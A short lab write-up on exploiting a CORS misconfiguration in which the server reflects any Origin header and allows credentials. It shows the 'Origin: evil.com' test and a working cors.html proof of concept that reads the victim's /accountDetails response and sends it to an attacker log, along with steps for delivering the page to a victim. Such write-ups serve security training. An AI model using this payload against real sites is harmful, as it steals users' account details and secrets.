### CORS vulnerability with basic origin reflection
/accountDetails API in response giving the below header.
```
Access-Control-Allow-Credentials: true
```
Add Origin: evil.com in request and notice the below headers get populated in response headers along with the account details of current user.
```
Access-Control-Allow-Origin: evil.com
Access-Control-Allow-Credentials: true
```
It is confirmed that it is vulnerable to CORS, lets craft out PoC.
cors.html
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://{HOSTNAME}/{ENDPOINT}',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
Above PoC you need to deliver to victim, once victim clicks on opens the PoC then his account specific details would come in attacker's logs. Dont forget to change HOSTNAME and endpoint value. In our case ENDPOINT should be accountDetails.


